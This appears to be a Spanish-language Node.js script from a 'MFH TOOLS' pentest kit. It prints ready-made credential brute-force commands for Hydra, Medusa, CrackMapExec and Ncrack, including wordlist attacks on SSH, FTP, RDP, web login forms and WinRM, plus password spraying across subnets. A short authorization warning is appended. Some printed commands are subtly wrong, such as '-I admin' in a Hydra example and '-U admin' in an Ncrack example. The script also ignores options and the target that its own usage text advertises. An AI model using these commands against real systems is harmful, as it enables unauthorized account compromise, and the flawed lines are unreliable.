#!/usr/bin/env node
/**
 * MFH TOOLS - Fuerza Bruta
 * Acceso con Credenciales
 * 
 * Integración: Hydra, Medusa, CrackMapExec, Ncrack
 * 
 * Uso: node brute-force.js --target <IP> [--service <ssh|ftp|http>] [--user <user>] [--wordlist <path>]
 * 
 * Autor: FalconMX Security
 */

'use strict';

const CONFIG = { version: '1.0.0', author: 'FalconMX Security' };

// ============================================================
// HERRAMIENTAS DE FUERZA BRUTA
// ============================================================
const TOOLS = {
    hydra: {
        name: 'Hydra',
        description: 'Herramienta rápida de cracking de login por red que soporta múltiples protocolos',
        install: [
            'sudo apt install hydra'
        ],
        usage: [
            'hydra -l <user> -P <wordlist> <target> <service>',
            'hydra -L users.txt -P passwords.txt ssh://<target>',
            'hydra -C creds.txt <target> http-get /'
        ],
        examples: [
            'hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh',
            'hydra -L users.txt -P pass.txt ftp://192.168.1.1',
            'hydra -I admin -P rockyou.txt <target> http-post-form "/login.php:username=^USER^&password=^PASS^:F=form name=\'login\'"'
        ],
        notes: [
            'Soporta SSH, FTP, HTTP, RDP, SMB y otros protocolos',
            '-C se usa para archivos con formato combinado user:pass',
            '-f detiene el ataque al encontrar la primera credencial válida'
        ]
    },
    medusa: {
        name: 'Medusa',
        description: 'Herramienta de fuerza bruta de login paralelizada, más rápida en ciertos escenarios',
        install: [
            'sudo apt install medusa'
        ],
        usage: [
            'medusa -h <target> -u <user> -P <wordlist> -M <module>',
            'medusa -H hosts.txt -U users.txt -P pass.txt -M ssh'
        ],
        examples: [
            'medusa -h 192.168.1.1 -u admin -P rockyou.txt -M ssh',
            'medusa -H targets.txt -U users.txt -P pass.txt -M ftp'
        ],
        notes: [
            'Soporta escaneo paralelo en múltiples hosts',
            'Diseño modular, -M especifica el módulo de servicio',
            'Más rápida que Hydra en algunos escenarios'
        ]
    },
    crackmapexec: {
        name: 'CrackMapExec',
        description: 'Herramienta post-explotación para validación automatizada de credenciales, soporta SMB/WinRM y otros protocolos',
        install: [
            'pip install crackmapexec'
        ],
        usage: [
            'crackmapexec <protocol> <target> -u <user> -p <password>',
            'crackmapexec winrm <target> -u users.txt -p passwords.txt'
        ],
        examples: [
            'crackmapexec winrm 192.168.1.1 -u administrator -p password123',
            'crackmapexec smb 192.168.1.0/24 -u users.txt -p pass.txt'
        ],
        notes: [
            'Diseñada para entornos Windows',
            'Soporta WinRM, SMB, MSSQL y otros protocolos',
            'Se puede usar para password spraying (rociado de credenciales)'
        ]
    },
    ncrack: {
        name: 'Ncrack',
        description: 'Herramienta de alta velocidad para cracking de autenticación de red, soporta SSH, RDP, FTP y más',
        install: [
            'sudo apt install ncrack'
        ],
        usage: [
            'ncrack -U <user> -P <wordlist> <target>:<port>',
            'ncrack --user admin -P pass.txt ssh://192.168.1.1'
        ],
        examples: [
            'ncrack -U users.txt -P pass.txt ssh://192.168.1.1',
            'ncrack -U admin -P rockyou.txt rdp://192.168.1.1'
        ],
        notes: [
            'Diseñada para cracking de alta velocidad',
            'Soporta SSH, RDP, FTP, Telnet, HTTP',
            'Adecuada para escenarios de escaneo a gran escala'
        ]
    }
};

// ============================================================
// Generación de reporte
// ============================================================
function printReport(target, service, selectedTool) {
    console.log('');
    console.log('═'.repeat(65));
    console.log('  🔨 REPORTE DE ATAQUE DE FUERZA BRUTA');
    console.log('  Objetivo: ' + (target || 'No especificado'));
    console.log('  Servicio: ' + (service || 'SSH (por defecto)'));
    console.log('  Fecha: ' + new Date().toISOString());
    console.log('═'.repeat(65));
    console.log('');

    var toolsToShow = selectedTool === 'all' ? Object.keys(TOOLS) :
                      TOOLS[selectedTool] ? [selectedTool] : Object.keys(TOOLS);

    toolsToShow.forEach(function(key) {
        var tool = TOOLS[key];
        console.log('📌 ' + tool.name);
        console.log('   ' + tool.description);
        console.log('');
        console.log('   🔧 Instalación:');
        tool.install.forEach(function(line) { console.log('      ' + line); });
        console.log('');
        console.log('   💻 Uso básico:');
        tool.usage.forEach(function(line) { console.log('      ' + line); });
        console.log('');
        console.log('   🎯 Ejemplos:');
        tool.examples.forEach(function(line) { console.log('      ' + line); });
        console.log('');
        console.log('   📝 Notas:');
        tool.notes.forEach(function(line) { console.log('      • ' + line); });
        console.log('');
        console.log('─'.repeat(65));
        console.log('');
    });

    console.log('  ⚠️ ADVERTENCIA');
    console.log('     Solo realiza fuerza bruta contra sistemas que tengas permiso de probar.');
    console.log('     Los ataques de credenciales no autorizados son ilegales.');
    console.log('');
    console.log('─'.repeat(65));
    console.log('');
}

// ============================================================
// CLI
// ============================================================
function main() {
    var args = process.argv.slice(2);
    var targetIdx = args.indexOf('--target');
    var serviceIdx = args.indexOf('--service');
    var toolIdx = args.indexOf('--tool');

    if (targetIdx === -1) {
        console.log('');
        console.log('╔══════════════════════════════════════════════════════╗');
        console.log('║  MFH TOOLS — Fuerza Bruta v' + CONFIG.version + '                    ║');
        console.log('║  ' + CONFIG.author + '                              ║');
        console.log('╚══════════════════════════════════════════════════════╝');
        console.log('');
        console.log('  Uso: node brute-force.js --target <IP> [--service <ssh|ftp|http>] [--tool <nombre>]');
        console.log('');
        console.log('  Herramientas:');
        Object.keys(TOOLS).forEach(function(k) {
            console.log('    • ' + k + ' - ' + TOOLS[k].name);
        });
        console.log('');
        console.log('  Ejemplos:');
        console.log('    node brute-force.js --target 192.168.1.1');
        console.log('    node brute-force.js --target 192.168.1.1 --service ftp --tool hydra');
        console.log('');
        process.exit(0);
    }

    var target = args[targetIdx + 1] || '192.168.1.1';
    var service = serviceIdx !== -1 ? args[serviceIdx + 1] : 'ssh';
    var tool = toolIdx !== -1 ? args[toolIdx + 1].toLowerCase() : 'all';

    console.log('\n🔨 Generando comandos de fuerza bruta...\n');
    printReport(target, service, tool);
}

main();
